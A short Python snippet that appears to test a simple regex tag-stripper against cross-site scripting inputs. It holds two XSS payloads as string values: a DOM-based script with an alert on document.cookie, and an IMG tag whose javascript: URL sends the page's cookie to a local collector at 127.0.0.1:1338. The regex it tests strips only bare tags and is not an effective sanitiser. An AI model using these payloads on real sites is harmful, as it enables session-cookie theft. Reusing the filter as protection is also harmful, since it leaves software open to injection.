import re

comment = '<script>var pos = document.URL.indexof("name=" + 5; document.write(document.URL.substring(pos,document.URL.length));</script>&name=<script>alert(document.cookie)</script>'
comment = '<IMG SRC="javascript:window.open(&apos;http://127.0.0.1:1338/xss/2?cookie=&apos; + document.cookie);">'
comment = ''
print(comment)
comment = re.sub(r'<[a-z]*>', '', comment, flags=re.IGNORECASE)
print(comment)
